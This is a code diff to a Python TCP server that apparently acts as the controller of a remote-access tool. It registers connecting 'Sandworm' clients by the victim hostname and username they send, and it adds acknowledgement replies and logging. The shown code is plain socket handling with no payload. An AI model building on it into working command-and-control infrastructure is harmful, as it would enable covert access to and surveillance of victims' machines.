@@ -46,12 +46,26 @@ class TCPServer:
                 client_socket, address = self.server.accept()
                 log.info(f"Accepted connection from {address[0]}:{address[1]}")
 
-                # TODO
-                # Extract the victime hostname and username
-                hostname = "tonysDesktop"
-                username = "tony"
+
+                # Recoit les données de départ du client
+                data = client_socket.recv(1024).decode().strip()
+
+                if not data:
+                    log.warning(f"Empty data received from {address[0]}")
+                    client_socket.close()
+                    continue
+
+                try:
+                    hostname, username = data.split(',')
+                
+                except ValueError:
+                    log.error(f"Malformed data received: {data}")
+                    client_socket.close()
+                    continue
+
+                # Adjust class variables
                 index = self.counter
-                self.counter+=1
+                self.counter += 1
 
                 # Store the client
                 self.clients[index] = {
@@ -64,6 +78,11 @@ class TCPServer:
                 self.on_new_sandworm(index, hostname, username, client_socket)
 
                 log.info(f"Sandworm [{index}] registered -> Host: {hostname}, User: {username}")
+                
+                # Send acknowledgment
+                print("Sending ACK..")
+                client_socket.send(b'ACK')
+
 
                 client_handler = threading.Thread(target=self.handle_client, args=(client_socket,index))
                 client_handler.daemon = True # Ensures threads exit when main program ends
@@ -88,6 +107,7 @@ class TCPServer:
                 data = client_socket.recv(1024)
 
                 if not data:
+                    log.info(f"No data received from client : {client_socket}")
                     break
 
                 data = data.decode().strip()
@@ -98,6 +118,7 @@ class TCPServer:
                     log.warning(f"Received 'exit' command, closing connection")
                     break
                 else:
+                    print("Sending ACK in handle client")
                     client_socket.send(b'ACK')
         
         except Exception as e:
